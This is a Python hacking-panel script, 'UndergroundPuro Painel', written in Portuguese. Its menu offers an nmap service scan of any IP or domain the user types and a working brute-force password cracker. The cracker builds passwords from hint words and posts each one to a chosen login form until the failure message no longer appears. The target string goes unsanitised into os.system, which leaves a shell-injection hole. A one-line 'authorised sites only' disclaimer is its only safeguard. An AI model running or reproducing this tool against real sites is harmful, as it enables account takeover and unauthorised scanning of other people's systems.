#undergroundpuro
import os
import itertools
import requests
from time import sleep
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.GREEN + """
====================================
       UndergroundPuro Painel
====================================""" + Style.RESET_ALL)

def nmap():
    alvo = input(Fore.GREEN + "\n[+] Digite o IP ou domínio para escanear: " + Style.RESET_ALL)
    print(Fore.YELLOW + f"\n[*] Escaneando {alvo} com Nmap..." + Style.RESET_ALL)
    os.system(f"nmap -sV -Pn {alvo}")

def hydra():
    print(Fore.GREEN + "\n[+] Bruteforce Real - Use apenas em sites autorizados" + Style.RESET_ALL)
    dicas = input("[+] Dicas de senhas (separadas por vírgulas): ").split(',')
    min_chars = int(input("[+] Número mínimo de caracteres: "))
    max_chars = int(input("[+] Número máximo de caracteres: "))
    url = input("[+] URL do login (ex: http://localhost/login): ")
    campo_user = input("[+] Nome do campo de usuário (ex: username): ")
    campo_pass = input("[+] Nome do campo de senha (ex: password): ")
    usuario = input("[+] Nome de usuário para testar: ")
    falha_resposta = input("[+] Palavra que indica login falhou (ex: inválido): ").lower()

    print(Fore.YELLOW + "\n[*] Gerando e testando combinações...\n" + Style.RESET_ALL)
    tentativa = 0
    for i in range(min_chars, max_chars + 1):
        for combo in itertools.product(dicas, repeat=i):
            senha = ''.join(combo)
            data = {campo_user: usuario, campo_pass: senha}
            try:
                r = requests.post(url, data=data)
                tentativa += 1
                if falha_resposta not in r.text.lower():
                    print(Fore.GREEN + f"\n[SENHA ENCONTRADA] {senha} após {tentativa} tentativas!" + Style.RESET_ALL)
                    return
                else:
                    print(f"[X] Tentativa {tentativa}: {senha}")
            except Exception as e:
                print(Fore.RED + f"[ERRO] {e}" + Style.RESET_ALL)
    print(Fore.RED + "\n[FIM] Nenhuma senha encontrada." + Style.RESET_ALL)

def bot():
    print(Fore.CYAN + "\n[+] Bot ainda em desenvolvimento..." + Style.RESET_ALL)

def main():
    while True:
        banner()
        print(Fore.GREEN + """
[1] Nmap (varredura real de redes)
[2] Hydra (bruteforce real de senhas)
[3] Bot (beta)
[0] Sair
""" + Style.RESET_ALL)

        opcao = input(Fore.YELLOW + "Escolha uma opção: " + Style.RESET_ALL)

        if opcao == '1':
            nmap()
        elif opcao == '2':
            hydra()
        elif opcao == '3':
            bot()
        elif opcao == '0':
            print(Fore.RED + "\nSaindo..." + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "\nOpção inválida!" + Style.RESET_ALL)
        input(Fore.CYAN + "\nPressione ENTER para voltar ao menu..." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
